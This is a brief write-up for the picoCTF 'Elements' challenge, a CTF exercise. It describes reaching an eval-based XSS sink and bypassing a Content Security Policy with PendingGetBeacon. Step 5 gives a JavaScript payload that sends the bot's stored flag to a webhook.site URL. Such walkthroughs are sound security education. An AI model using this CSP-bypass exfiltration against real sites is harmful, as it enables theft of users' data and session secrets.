# picoCTF Elements Writeup

1. Check `index.js` and find that `eval(state.xss)` will execute when we combine two elements to create `XSS`.

2. Notice that `Exploit + Web Design = XSS`, so use Python DFS to find the 26 steps needed to create XSS from the four starting elements.

3. Check `index.mjs` and find that the bot stores the flag in `state.flag`. However, CSP blocks normal requests like `fetch()`, so we cannot directly send the flag to our webhook.

4. Notice that Chromium enables experimental web features, so we can use `PendingGetBeacon` to bypass CSP and send the flag.

5. Use this XSS payload:

   ```javascript
   new PendingGetBeacon("https://webhook.site/YOUR-UUID?flag="+encodeURIComponent(state.flag)).sendNow();
   ```

6. Submit the recipe and XSS payload to `/remoteCraft`, then check the webhook to get the flag!
